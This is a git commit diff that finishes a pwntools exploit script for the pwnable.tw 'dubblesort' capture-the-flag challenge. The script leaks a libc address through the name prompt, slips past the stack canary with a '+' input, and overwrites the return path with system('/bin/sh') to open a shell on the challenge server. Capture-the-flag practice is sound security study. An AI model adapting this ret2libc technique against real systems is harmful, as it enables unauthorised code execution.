bc9d1a838f77cf8bf5153000f427c9e5fcb7ee7e
kyystt <gui.sobreira10@gmail.com>
2026-06-05 02:48:48 -0300

    pwnabletw dubblesort solved

--- pwnabletw/dubblesort/solve.py
+++ pwnabletw/dubblesort/solve.py
@@ -1,6 +1,6 @@
 from pwn import *
 
-elf = ELF("./dubblesort_patched")
+elf = ELF("./dubblesort")
 libc = ELF("./libc.so.6")
 
 context.binary = elf
@@ -9,10 +9,12 @@ context.log_level = 'debug'
 
 def conn():
     if args.REMOTE:
-        p = remote("addr", 1337)
+        p = remote("chall.pwnable.tw", 10101)
     else:
         if args.GDB:
             p = gdb.debug([elf.path], aslr=True, api=False, gdbscript="""
+            b main+85
+            b *main + 240
                 """)
         else:
             p = process([elf.path])
@@ -23,8 +25,34 @@ def main():
     p = conn()
 
     # pwn it
-    p.sendafter(b"name :", b"sexo sem parar")
+    p.sendlineafter(b"name :", b"A"*27 + b"Z")
+    p.recvuntil(b"Z")
 
+    leak = u32(p.recv(4))
+    log.info(f"leak: {hex(leak)}")
+
+    libc.address = leak - 0x1b0000 - 0xa
+
+    log.success(f"libc base address: {hex(libc.address)}")
+
+    system = libc.symbols.system
+    binsh = next(libc.search(b"/bin/sh\x00"))
+
+    p.sendlineafter(b"sort :", str(35).encode())
+
+    i = 0
+
+    for _ in range(35):
+        p.recvuntil(b": ")
+        if i == 24:
+            p.sendline(b"+")
+        elif i >= 25 and i <= 33:
+            p.sendline(str(system).encode())
+        elif i == 34:
+            p.sendline(str(binsh).encode())
+        else:
+            p.sendline(str(i).encode())
+        i += 1
 
     p.interactive()
 
